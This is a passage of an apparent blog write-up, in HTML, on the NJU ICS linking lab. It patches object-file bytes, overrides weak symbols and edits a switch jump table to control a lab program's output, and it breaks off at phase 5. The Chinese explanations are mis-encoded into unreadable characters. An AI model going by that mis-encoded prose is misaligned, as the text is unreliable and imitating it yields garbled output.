<span class="number">00000000</span>   <span class="built_in">puts</span></span><br></pre></td></tr></table></figure><p>do_phaseé‡Œçš„éƒ½æ˜¯nopï¼Œè‚¯å®šè¦åˆ©ç”¨putså‡½æ•°æ¥è¾“å‡ºï¼Œä»–çš„é‡å®šä½ä¿¡æ¯åªæœ‰åœ¨00000085æœ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨do_phaseé‡Œå¸ƒç½®å¥½æ ˆå¸§ï¼Œç„¶åe9 jmpç›¸å¯¹è·³è½¬åˆ°è¿™ä¸ªputså°±å¯ä»¥è¾“å‡º</p><p>å…ˆå¸ƒç½®æ ˆå¸§æŠŠ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub esp,<span class="number">0x30</span></span><br><span class="line">mov dword ptr [ebp<span class="number">-0x10</span>],<span class="number">72</span>h</span><br><span class="line">mov dword ptr [ebp<span class="number">-0x14</span>],<span class="number">65787267</span>h</span><br><span class="line">lea eax, [ebp<span class="number">-0x18</span>]</span><br><span class="line">push eax</span><br></pre></td></tr></table></figure><p><img src="/2023/05/08/ics4-linklab/image-20230506223216046.png" alt="image-20230506223216046"></p><p>ç”¨ida patchäº†ä¸€ä¸‹ï¼Œæ¥ä¸‹æ¥å°±æ˜¯jmpåˆ°84</p><p>**intelæ‰‹å†Œ 64-ia-32-architectures-software-developer-instruction-set-reference-manual-ç¬¬2å· **</p><p><img src="/2023/05/08/ics4-linklab/image-20230506221626593.png" alt="image-20230506221626593"></p><blockquote><p>ä¸ºä»€ä¹ˆæ²¡æœ‰é€‰æ‹© ç›¸å¯¹åœ°å€çš„e8 callæ˜¯å› ä¸ºå¦‚æœæ˜¯e8 callè¿‡å»ä¼šæŠŠè¿”å›åœ°å€å…ˆpushæ ˆé‡Œï¼Œä¼šæŠŠcall putsçš„å‚æ•°ç»™ç ´ç¯æ‰</p><p><img src="/2023/05/08/ics4-linklab/image-20230506213529559.png" alt="image-20230506213529559"></p></blockquote><p>æˆ‘ä»¬åªèƒ½è‡ªå·±åšé‡å®šä½ï¼ŒcallæŒ‡ä»¤å¸ƒç½®åœ¨a9å¤„ï¼Œå 5ä¸ªå­—èŠ‚(ä¸€å­—èŠ‚çš„æ“ä½œç ï¼Œå››å­—èŠ‚çš„åç§»)ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤åœ¨aeå¤„ï¼Œæ‰€ä»¥åç§»ä¸º84-aeå³FFFF FFD6</p><p>æ‰€ä»¥å­—èŠ‚ç ä¸ºe9 d6 ff ff ffï¼Œç”¨010æ”¹ä¸‹</p><p><img src="/2023/05/08/ics4-linklab/image-20230506223052595.png" alt="image-20230506223052595"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000091</span> &lt;do_phase&gt;:</span><br><span class="line">  <span class="number">91</span>:   <span class="number">55</span>                      push   %ebp</span><br><span class="line">  <span class="number">92</span>:   <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line">  <span class="number">94</span>:   <span class="number">83</span> ec <span class="number">30</span>                sub    $<span class="number">0x30</span>,%esp</span><br><span class="line">  <span class="number">97</span>:   c7 <span class="number">45</span> f0 <span class="number">72</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   $<span class="number">0x72</span>,<span class="number">-0x10</span>(%ebp)</span><br><span class="line">  <span class="number">9</span>e:   c7 <span class="number">45</span> ec <span class="number">67</span> <span class="number">72</span> <span class="number">78</span> <span class="number">65</span>    movl   $<span class="number">0x65787267</span>,<span class="number">-0x14</span>(%ebp)</span><br><span class="line">  a5:   <span class="number">8</span>d <span class="number">45</span> ec                lea    <span class="number">-0x14</span>(%ebp),%eax</span><br><span class="line">  a8:   <span class="number">50</span>                      push   %eax</span><br><span class="line">  a9:   e9 d6 ff ff ff          jmp    <span class="number">84</span> &lt;kfSvKnbh+<span class="number">0x23</span>&gt;</span><br></pre></td></tr></table></figure><p>kfSvKnbhé‡Œçš„ leave retä¼šå¸®æˆ‘ä»¬å¹³æ ˆåè¿”å›åˆ°mainé‡Œè°ƒç”¨do_phaseçš„ä¸‹ä¸€æ¡æŒ‡ä»¤å¤„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase2.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">grxer</span><br></pre></td></tr></table></figure><h2 id="phase3"><a href="#phase3" class="headerlink" title="phase3"></a>phase3</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -m32 -no-pie -o linkbomb main.o phase3.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br></pre></td></tr></table></figure><p>ä»€ä¹ˆä¹Ÿæ²¡è¾“å‡º</p><p>çœ‹ä¸‹æ±‡ç¼–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">080491c6 &lt;do_phase&gt;:</span><br><span class="line"> 80491c6:       55                      push   %ebp</span><br><span class="line"> 80491c7:       89 e5                   mov    %esp,%ebp</span><br><span class="line"> 80491c9:       83 ec 18                sub    $0x18,%esp</span><br><span class="line"> 80491cc:       c7 45 ea 79 7a 67 69    movl   $0x69677a79,-0x16(%ebp);ä»è¿™é‡Œå¼€å§‹å°±æ˜¯ä¸€ç§åˆ° 80491daéƒ½æ˜¯åœ¨èµ‹å€¼ç»™ebp-0x16å¤„çš„å±€éƒ¨å˜é‡cookie</span><br><span class="line"> 80491d3:       c7 45 ee 75 68 6e 62    movl   $0x626e6875,-0x12(%ebp)</span><br><span class="line"> 80491da:       66 c7 45 f2 65 00       movw   $0x65,-0xe(%ebp);èµ‹å€¼cookieç»“æŸ</span><br><span class="line"> 80491e0:       c7 45 f4 00 00 00 00    movl   $0x0,-0xc(%ebp) ;ebp-cè¿™ä¸ªåœ°æ–¹å­˜çš„å°±æ˜¯è®¡æ•°å™¨</span><br><span class="line"> 80491e7:       eb 28                   jmp    8049211 &lt;do_phase+0x4b&gt;</span><br><span class="line"> </span><br><span class="line"> 80491e9:       8d 55 ea                lea    -0x16(%ebp),%edx</span><br><span class="line"> 80491ec:       8b 45 f4                mov    -0xc(%ebp),%eax</span><br><span class="line"> 80491ef:       01 d0                   add    %edx,%eax</span><br><span class="line"> 80491f1:       0f b6 00                movzbl (%eax),%eax;æ‹¿å‡ºcookie[è®¡æ•°å™¨]é‡Œçš„å€¼</span><br><span class="line"> 80491f4:       0f b6 c0                movzbl %al,%eax</span><br><span class="line"> 80491f7:       0f b6 80 60 c0 04 08    movzbl 0x804c060(%eax),%eax;0x804c060å¤„æ˜¯ä¸€ä¸ªå«åšNQqPQyqUthçš„å˜é‡ç¬¦å·ï¼Œæ‰€ä»¥eaxå°±æ˜¯NQqPQyqUth+cookie[è®¡æ•°å™¨]åœ°å€é‡Œçš„å€¼</span><br><span class="line"> 80491fe:       0f be c0                movsbl %al,%eax</span><br><span class="line"> 8049201:       83 ec 0c                sub    $0xc,%esp</span><br><span class="line"> 8049204:       50                      push   %eax</span><br><span class="line"> 8049205:       e8 56 fe ff ff          call   8049060 &lt;putchar@plt&gt;</span><br><span class="line"> 804920a:       83 c4 10                add    $0x10,%esp</span><br><span class="line"> 804920d:       83 45 f4 01             addl   $0x1,-0xc(%ebp);è®¡æ•°å™¨åŠ 1</span><br><span class="line"> </span><br><span class="line"> 8049211:       8b 45 f4                mov    -0xc(%ebp),%eax</span><br><span class="line"> 8049214:       83 f8 08                cmp    $0x8,%eax;è®¡æ•°å™¨å¤§äº8ä¹‹åå°±è¾“å‡ºæ¢è¡Œç»“æŸäº†</span><br><span class="line"> 8049217:       76 d0                   jbe    80491e9 &lt;do_phase+0x23&gt;</span><br><span class="line"> 8049219:       83 ec 0c                sub    $0xc,%esp</span><br><span class="line"> 804921c:       6a 0a                   push   $0xa ;æœ€åè¾“å‡ºä¸€ä¸ªæ¢è¡Œ</span><br><span class="line"> 804921e:       e8 3d fe ff ff          call   8049060 &lt;putchar@plt&gt;</span><br><span class="line"> 8049223:       83 c4 10                add    $0x10,%esp</span><br><span class="line"> 8049226:       90                      nop</span><br><span class="line"> 8049227:       c9                      leave</span><br><span class="line"> 8049228:       c3                      ret</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹ç¬¦å·è¡¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -s phase3.o</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 14 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FILE    LOCAL  DEFAULT  ABS phase3.c</span><br><span class="line">     2: 00000000     0 SECTION LOCAL  DEFAULT    1 .text</span><br><span class="line">     3: 00000000     0 SECTION LOCAL  DEFAULT    3 .data</span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    5 .bss</span><br><span class="line">     5: 00000000     0 SECTION LOCAL  DEFAULT    6 .rodata</span><br><span class="line">     6: 00000000     0 SECTION LOCAL  DEFAULT    8 .note.GNU-stack</span><br><span class="line">     7: 00000000     0 SECTION LOCAL  DEFAULT    9 .eh_frame</span><br><span class="line">     8: 00000000     0 SECTION LOCAL  DEFAULT    7 .comment</span><br><span class="line">     9: 00000000     4 OBJECT  GLOBAL DEFAULT    3 phase_id</span><br><span class="line">    10: 00000020   256 OBJECT  GLOBAL DEFAULT  COM NQqPQyqUth</span><br><span class="line">    11: 00000000    99 FUNC    GLOBAL DEFAULT    1 do_phase</span><br><span class="line">    12: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND putchar</span><br><span class="line">    13: 00000004     4 OBJECT  GLOBAL DEFAULT    3 phase</span><br></pre></td></tr></table></figure><p>ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œé€†å‘ä¸ºcä»£ç å¤§è‡´å°±æ˜¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> NQqPQyqUth[<span class="number">256</span>];</span><br><span class="line">do_phase&#123;</span><br><span class="line">    <span class="type">char</span> cookie[<span class="number">10</span>]=&#123; <span class="number">79</span> <span class="number">7</span>a <span class="number">67</span> <span class="number">69</span>  <span class="number">75</span> <span class="number">68</span> <span class="number">6</span>e <span class="number">62</span>  <span class="number">65</span> <span class="number">00</span>&#125;;<span class="comment">//æ‡’å¾—åŠ é€—å·äº†</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span> ; i++)</span><br><span class="line">        <span class="built_in">putchar</span>(NQqPQyqUth[cookie[i]]);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NQqPQyqUthåœ¨COMMonå—ï¼Œæ•°æ®éƒ½ä¸º0ï¼Œæ‰€ä»¥æ²¡æœ‰è¾“å‡ºï¼Œç”±äºå±äºæ˜¯å¼±ç¬¦å·ï¼Œé“¾æ¥æ—¶ä¼šè¢«å¼ºç¬¦å·ç»™æŒ¤æ‰ï¼Œ <a href="https://grxer.github.io/2023/04/28/static-link/">https://grxer.github.io/2023/04/28/static-link/</a> é‡Œæœ‰åˆ†æè¿‡</p><p>æ‰€ä»¥æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªå¼ºç¬¦å·NQqPQyqUthï¼Œå¹¶æŒ‰ç…§cookieèµ‹å€¼å°±å¯ä»¥è¾“å‡ºäº†</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//phase3_patch.c</span></span><br><span class="line"><span class="type">char</span> NQqPQyqUth[<span class="number">256</span>]=<span class="string">&quot;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x0e00000000000r000gr&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie  -c phase3_patch.c</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase3.o phase3_patch.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">grxer0000</span><br></pre></td></tr></table></figure><h2 id="phase4"><a href="#phase4" class="headerlink" title="phase4"></a>phase4</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase4.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">B9[wL:Nec</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000029 &lt;do_phase&gt;:</span><br><span class="line">  29:   55                      push   %ebp</span><br><span class="line">  2a:   89 e5                   mov    %esp,%ebp</span><br><span class="line">  2c:   83 ec 28                sub    $0x28,%esp</span><br><span class="line">  2f:   c7 45 e6 53 4e 58 47    movl   $0x47584e53,-0x1a(%ebp)</span><br><span class="line">  36:   c7 45 ea 4a 54 43 46    movl   $0x4643544a,-0x16(%ebp)</span><br><span class="line">  3d:   66 c7 45 ee 50 00       movw   $0x50,-0x12(%ebp);ä»ebp-0x1aå¤„å¼€å§‹çš„cookieèµ‹å€¼ç»“æŸ</span><br><span class="line">  43:   c7 45 f0 00 00 00 00    movl   $0x0,-0x10(%ebp);ebp-0x10å¤„è®¡æ•°å™¨ç½®é›¶</span><br><span class="line">  4a:   e9 e0 00 00 00          jmp    12f &lt;do_phase+0x106&gt;</span><br><span class="line">  </span><br><span class="line">  4f:   8d 55 e6                lea    -0x1a(%ebp),%edx</span><br><span class="line">  52:   8b 45 f0                mov    -0x10(%ebp),%eax</span><br><span class="line">  55:   01 d0                   add    %edx,%eax</span><br><span class="line">  57:   0f b6 00                movzbl (%eax),%eax;eax=cookie[è®¡æ•°å™¨]</span><br><span class="line">  5a:   88 45 f7                mov    %al,-0x9(%ebp)</span><br><span class="line">  5d:   0f be 45 f7             movsbl -0x9(%ebp),%eax</span><br><span class="line">  61:   83 e8 41                sub    $0x41,%eax;cookie[è®¡æ•°å™¨]-0x41 ç›¸å½“äºæˆ‘ä»¬çš„caseå€¼</span><br><span class="line">  64:   83 f8 19                cmp    $0x19,%eax;cookie[è®¡æ•°å™¨]-0x41å’Œ19æ¯”è¾ƒ</span><br><span class="line">  67:   0f 87 b0 00 00 00       ja     11d &lt;do_phase+0xf4&gt;;å¤§äºè·³è½¬ç±»ä¼¼äºæˆ‘ä»¬switchçš„default</span><br><span class="line">  6d:   8b 04 85 04 00 00 00    mov    0x4(,%eax,4),%eax;ä»ä¸‹é¢çš„é‡å®šä½ä¿¡æ¯æ¥çœ‹ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªéœ€è¦é‡å®šä½çš„åœ°å€.rodataï¼Œeax=*(eax*4+.rodata+4)</span><br><span class="line">  74:   ff e0                   jmp    *%eax;switchçš„è·³è½¬ï¼Œè¿™é‡Œå’Œæˆ‘å¹³æ—¶è§çš„switchéƒ½ä¸å¤ªä¸€æ ·ï¼Œå°±å»å®éªŒäº†ä¸€ä¸‹ï¼Œå‘ç°å½“caseæƒ…å†µè¿‡å¤šæ—¶ï¼Œå°±ä¼šé‡‡ç”¨è¿™ç§jmp *eaxçš„è·³è½¬æ–¹å¼,ä¼šæœ‰ä¸€å¼ è·³è½¬è¡¨</span><br><span class="line">  76:   c6 45 f7 38             movb   $0x38,-0x9(%ebp)</span><br><span class="line">  7a:   e9 9e 00 00 00          jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  7f:   c6 45 f7 65             movb   $0x65,-0x9(%ebp)</span><br><span class="line">  83:   e9 95 00 00 00          jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  88:   c6 45 f7 35             movb   $0x35,-0x9(%ebp)</span><br><span class="line">  8c:   e9 8c 00 00 00          jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  91:   c6 45 f7 39             movb   $0x39,-0x9(%ebp)</span><br><span class="line">  95:   e9 83 00 00 00          jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  9a:   c6 45 f7 6d             movb   $0x6d,-0x9(%ebp)</span><br><span class="line">  9e:   eb 7d                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  a0:   c6 45 f7 6d             movb   $0x6d,-0x9(%ebp)</span><br><span class="line">  a4:   eb 77                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  a6:   c6 45 f7 4c             movb   $0x4c,-0x9(%ebp)</span><br><span class="line">  aa:   eb 71                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  ac:   c6 45 f7 73             movb   $0x73,-0x9(%ebp)</span><br><span class="line">  b0:   eb 6b                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  b2:   c6 45 f7 45             movb   $0x45,-0x9(%ebp)</span><br><span class="line">  b6:   eb 65                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  b8:   c6 45 f7 37             movb   $0x37,-0x9(%ebp)</span><br><span class="line">  bc:   eb 5f                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  be:   c6 45 f7 42             movb   $0x42,-0x9(%ebp)</span><br><span class="line">  c2:   eb 59                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  c4:   c6 45 f7 77             movb   $0x77,-0x9(%ebp)</span><br><span class="line">  c8:   eb 53                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  ca:   c6 45 f7 36             movb   $0x36,-0x9(%ebp)</span><br><span class="line">  ce:   eb 4d                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  d0:   c6 45 f7 3a             movb   $0x3a,-0x9(%ebp)</span><br><span class="line">  d4:   eb 47                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  d6:   c6 45 f7 5b             movb   $0x5b,-0x9(%ebp)</span><br><span class="line">  da:   eb 41                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  dc:   c6 45 f7 63             movb   $0x63,-0x9(%ebp)</span><br><span class="line">  e0:   eb 3b                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  e2:   c6 45 f7 5b             movb   $0x5b,-0x9(%ebp)</span><br><span class="line">  e6:   eb 35                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  e8:   c6 45 f7 33             movb   $0x33,-0x9(%ebp)</span><br><span class="line">  ec:   eb 2f                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  ee:   c6 45 f7 55             movb   $0x55,-0x9(%ebp)</span><br><span class="line">  f2:   eb 29                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  f4:   c6 45 f7 77             movb   $0x77,-0x9(%ebp)</span><br><span class="line">  f8:   eb 23                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  fa:   c6 45 f7 32             movb   $0x32,-0x9(%ebp)</span><br><span class="line">  fe:   eb 1d                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line"> 100:   c6 45 f7 4e             movb   $0x4e,-0x9(%ebp)</span><br><span class="line"> 104:   eb 17                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line"> 106:   c6 45 f7 30             movb   $0x30,-0x9(%ebp)</span><br><span class="line"> 10a:   eb 11                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line"> 10c:   c6 45 f7 31             movb   $0x31,-0x9(%ebp)</span><br><span class="line"> 110:   eb 0b                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line"> 112:   c6 45 f7 34             movb   $0x34,-0x9(%ebp)</span><br><span class="line"> 116:   eb 05                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line"> 118:   c6 45 f7 67             movb   $0x67,-0x9(%ebp)</span><br><span class="line"> 11c:   90                      nop</span><br><span class="line"> </span><br><span class="line"> 11d:   8d 55 dc                lea    -0x24(%ebp),%edx</span><br><span class="line"> 120:   8b 45 f0                mov    -0x10(%ebp),%eax</span><br><span class="line"> 123:   01 c2                   add    %eax,%edx;edx=ebp-0x24+è®¡æ•°å™¨</span><br><span class="line"> 125:   0f b6 45 f7             movzbl -0x9(%ebp),%eax</span><br><span class="line"> 129:   88 02                   mov    %al,(%edx);*(ebp-0x24+è®¡æ•°å™¨)=*(ebp-9ï¼‰</span><br><span class="line"> 12b:   83 45 f0 01             addl   $0x1,-0x10(%ebp);è®¡æ•°å™¨+1</span><br><span class="line"> </span><br><span class="line"> 12f:   8b 45 f0                mov    -0x10(%ebp),%eax</span><br><span class="line"> 132:   83 f8 08                cmp    $0x8,%eax</span><br><span class="line"> 135:   0f 86 14 ff ff ff       jbe    4f &lt;do_phase+0x26&gt;;è®¡æ•°å™¨&gt;9ç›´æ¥ç»“æŸ</span><br><span class="line"> </span><br><span class="line"> 13b:   8d 55 dc                lea    -0x24(%ebp),%edx</span><br><span class="line"> 13e:   8b 45 f0                mov    -0x10(%ebp),%eax</span><br><span class="line"> 141:   01 d0                   add    %edx,%eax</span><br><span class="line"> 143:   c6 00 00                movb   $0x0,(%eax)</span><br><span class="line"> 146:   83 ec 0c                sub    $0xc,%esp</span><br><span class="line"> 149:   8d 45 dc                lea    -0x24(%ebp),%eax </span><br><span class="line"> 14c:   50                      push   %eax;ebp-0x24åšputså‚æ•°</span><br><span class="line"> 14d:   e8 fc ff ff ff          call   14e &lt;do_phase+0x125&gt;;putså‡½æ•°</span><br><span class="line"> 152:   83 c4 10                add    $0x10,%esp</span><br><span class="line"> 155:   90                      nop</span><br><span class="line"> 156:   c9                      leave</span><br><span class="line"> 157:   c3                      ret</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -r phase4.o</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rel.text&#x27; at offset 0x3e0 contains 2 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">00000070  00000701 R_386_32          00000000   .rodata</span><br><span class="line">0000014e  00000d02 R_386_PC32        00000000   puts</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rel.data&#x27; at offset 0x3f0 contains 2 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">00000030  00000701 R_386_32          00000000   .rodata</span><br><span class="line">00000034  00000c01 R_386_32          00000029   do_phase</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rel.rodata&#x27; at offset 0x400 contains 26 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">00000004  00000201 R_386_32          00000000   .text</span><br><span class="line">00000008  00000201 R_386_32          00000000   .text</span><br><span class="line">0000000c  00000201 R_386_32          00000000   .text</span><br><span class="line">00000010  00000201 R_386_32          00000000   .text</span><br><span class="line">00000014  00000201 R_386_32          00000000   .text</span><br><span class="line">00000018  00000201 R_386_32          00000000   .text</span><br><span class="line">0000001c  00000201 R_386_32          00000000   .text</span><br><span class="line">00000020  00000201 R_386_32          00000000   .text</span><br><span class="line">00000024  00000201 R_386_32          00000000   .text</span><br><span class="line">00000028  00000201 R_386_32          00000000   .text</span><br><span class="line">0000002c  00000201 R_386_32          00000000   .text</span><br><span class="line">00000030  00000201 R_386_32          00000000   .text</span><br><span class="line">00000034  00000201 R_386_32          00000000   .text</span><br><span class="line">00000038  00000201 R_386_32          00000000   .text</span><br><span class="line">0000003c  00000201 R_386_32          00000000   .text</span><br><span class="line">00000040  00000201 R_386_32          00000000   .text</span><br><span class="line">00000044  00000201 R_386_32          00000000   .text</span><br><span class="line">00000048  00000201 R_386_32          00000000   .text</span><br><span class="line">0000004c  00000201 R_386_32          00000000   .text</span><br><span class="line">00000050  00000201 R_386_32          00000000   .text</span><br><span class="line">00000054  00000201 R_386_32          00000000   .text</span><br><span class="line">00000058  00000201 R_386_32          00000000   .text</span><br><span class="line">0000005c  00000201 R_386_32          00000000   .text</span><br><span class="line">00000060  00000201 R_386_32          00000000   .text</span><br><span class="line">00000064  00000201 R_386_32          00000000   .text</span><br><span class="line">00000068  00000201 R_386_32          00000000   .text</span><br></pre></td></tr></table></figure><p>åˆ†æè¿‡åé€†å‡ºå¤§è‡´cä»£ç </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">do_phase&#123;</span><br><span class="line">    <span class="type">char</span> cookie[<span class="number">10</span>]=&#123; <span class="number">53</span> <span class="number">4</span>e <span class="number">58</span> <span class="number">47</span>  <span class="number">4</span>a <span class="number">54</span> <span class="number">43</span> <span class="number">46</span>  <span class="number">50</span> <span class="number">00</span>&#125;;</span><br><span class="line">    <span class="type">char</span> answer[<span class="number">10</span>];</span><br><span class="line">    <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">switch</span> ï¼ˆtmp=cookie[i]<span class="number">-0x41</span>ï¼‰&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                tmp=xxx;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            .....</span><br><span class="line">            <span class="keyword">case</span> <span class="number">26</span>:</span><br><span class="line">                tmp=xxx;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">break</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">        answer[i]=tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    answer[<span class="number">10</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(answer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤šä¸ªswithä¼šåœ¨.rodataé‡Œç”Ÿæˆä¸€å¼ è·³è½¬è¡¨ï¼Œè·³è½¬è¡¨åœ¨é“¾æ¥æ—¶éœ€è¦é‡å®šä½ï¼Œ.rel.rodataé‡Œæœ‰å¤§é‡çš„é‡å®šä½ä¿¡æ¯ï¼Œéƒ½æ˜¯ç»å¯¹å¯»å€ä¿®æ­£ï¼Œoffsetè¡¨ç¤ºè¦ä¿®æ­£çš„ä½ç½®è·ç¦».rel.rodataçš„å€¼ï¼ŒSym. Nameè¡¨ç¤ºè¦æŠŠä¿®æ­£ä½ç½®åŠ ä¸Š.textç¬¦å·çš„åœ°å€ï¼Œé‡å®šä½æ˜¯åœ¨ç¬¦å·è¡¨é‡Œçš„åœ°å€ç¡®å®šåè¿›è¡Œçš„ï¼Œ <a href="https://grxer.github.io/2023/04/28/static-link/">https://grxer.github.io/2023/04/28/static-link/</a> é‡Œåˆ†æè¿‡</p><p>æ¯”å¦‚è¯´æˆ‘ä»¬çš„cookieç¬¬ä¸€ä¸ªä¸º53ï¼Œ0x53-0x41&#x3D;0x12ï¼Œ</p><p>æ ¹æ®<code>  6d:   8b 04 85 04 00 00 00    mov    0x4(,%eax,4),%eax;</code>åœ¨.rodataçš„åç§»ä¸º0x12*4+4&#x3D;0x4c</p><p><img src="/2023/05/08/ics4-linklab/image-20230507173942701.png" alt="image-20230507173942701"></p><p>jmp *%eaxæ‰€ä»¥è·³è½¬åˆ°0beï¼Œå³<code> be:   c6 45 f7 42             movb   $0x42,-0x9(%ebp)</code></p><p><img src="/2023/05/08/ics4-linklab/image-20230507174043686.png" alt="image-20230507174043686"></p><p>æ‰€ä»¥ç¬¬ä¸€ä¸ªè¾“å‡ºäº†Bï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠè·³è½¬è¡¨é‡Œå¾—å€¼æ ¹æ®cookieè·³è½¬åˆ°æŠŠå¯¹åº”æ•°å­—é€å…¥ebp-9å¤„å³å¯</p><p>æˆ‘æŠŠå®ƒéƒ½æ”¹ä¸º6å§å“ˆ</p><p><img src="/2023/05/08/ics4-linklab/image-20230507174600892.png" alt="image-20230507174600892"></p><p>æ‡’å¾—æŸ¥ç¬¬å‡ ä¸ªï¼Œæ‰€ä»¥éƒ½æ”¹äº†ã€‚ã€‚ã€‚ã€‚ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase4.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line"><span class="number">666666666</span></span><br></pre></td></tr></table></figure><h2 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase5.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">fish: Job <span class="number">1</span>, <span class="string">&#x27;./linkbomb&#x27;</span> terminated by signal <span class="title function_">SIGILL</span> <span class="params">(Illegal instruction)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span 